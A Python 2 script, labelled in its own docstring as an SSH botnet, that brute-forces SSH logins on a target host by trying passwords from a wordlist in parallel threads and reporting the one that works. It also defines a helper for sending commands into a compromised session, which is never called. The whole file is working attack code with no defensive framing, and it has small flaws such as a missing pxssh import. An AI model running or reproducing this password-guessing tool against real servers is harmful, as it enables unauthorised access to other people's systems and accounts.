"""A SSH botnet."""
import pexpect
import optparse
import time
from threading import *

max_connections = 5
found = False
fails = 0
connection_lock = BoundedSemaphore(value=max_connections)


def send_command(child, cmd):
    """Function sends the command string to SSH session and waits for cmd."""
    child.sendline(cmd)
    child.prompt()
    print (child.before)


def connect(host, user, password, release):
    """Function esptablishes a SSH connection to a target host."""
    global found
    global fails

    try:
        s = pexpect.pxssh.pxssh()
        s.login(host, user, password)
        print ('[+] Password Found: ' + password)
        found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    """Main function."""
    parser = optparse.OptionParser(
        'usage: %prog -H <host> -u <user> -F <password list>')
    parser.add_option(
        '-H', dest='target_host', type='string',
        help="specify target host"
    )
    parser.add_option(
        '-F', dest="password_file", type='string',
        help='specify password file')
    parser.add_option(
        '-u', dest="user", type='string',
        help='specify the user')
    (options, args) = parser.parse_args()

    host = options.target_host
    password_file = options.password_file
    user = options.user
    if (host is None) or (password_file is None) or (user is None):
        print (parser.usage)
        exit(0)

    fs = open(password_file, 'r')
    for line in fs.readlines():
        if found:
            print "[*] Exiting: Password found"
            exit(0)

        if fails > 5:
            print "[!] Exiting: Too many socket timeouts"
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing... " + str(password)
        thread = Thread(target=connect, args=(host, user, password, True))
        child = thread.start()

if __name__ == '__main__':
    main()
